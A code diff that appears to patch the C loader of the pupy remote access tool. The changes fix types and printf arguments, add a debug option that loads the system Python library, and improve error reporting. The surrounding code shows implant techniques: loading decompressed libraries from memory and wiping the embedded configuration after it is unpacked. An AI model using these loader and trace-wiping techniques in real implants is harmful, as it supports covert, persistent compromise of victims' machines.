@@ -37,7 +37,7 @@ static const char *preload_modules[] = {
 static HMODULE xz_dynload(const char *libname, const char *xzbuf, size_t xzsize, void *arg) {
     HMODULE hModule;
     void *uncompressed = NULL;
-    size_t uncompressed_size = 0;
+    Py_ssize_t uncompressed_size = 0;
 
     dprint("Uncompressing %s from %p (size=%d\n)\n", libname, xzbuf, xzsize);
 
@@ -81,6 +81,10 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
         return TRUE;
     }
 
+#ifdef DEBUG_USE_OS_PYTHON
+    hPython = OSLoadLibrary("libpython2.7.so.1.0");
+    resolver = OSResolveSymbol;
+#else
     for (dependency=dependencies; !hPython; dependency ++) {
         HMODULE hModule = CheckLibraryLoaded(dependency->name);
 
@@ -104,7 +108,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
         OSUnmapRegion(dependency->bytes, dependency->size);
 
         if (!hModule) {
-            dprint("%s: load failed\n");
+            dprint("%s: load failed\n", dependency->name);
             return FALSE;
         }
 
@@ -113,6 +117,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
             resolver = MemResolveSymbol;
         }
     }
+#endif
 
     dprint("Loading python from %p\n", hPython);
 
@@ -416,7 +421,6 @@ void run_pupy() {
     } len;
 
     PyObject *pupy;
-    PyObject *future;
 
     PyObject *py_config_list;
     PyObject *py_pupylib;
@@ -443,12 +447,13 @@ void run_pupy() {
     dprint("Config size: %d\n", len.l);
 
     py_config_list = PyObject_lzmaunpack(__config__+4, len.l);
-    dprint("Config parcel unpacked: %p\n", py_config_list);
     if (!py_config_list) {
         dprint("Config unpack failed\n");
+        PyErr_Print();
         goto lbExit1;
     }
 
+    dprint("Config parcel unpacked: %p\n", py_config_list);
     dprint("Cleanup config\n");
     memset(__config__, 0xFF, len.l + 4);
 
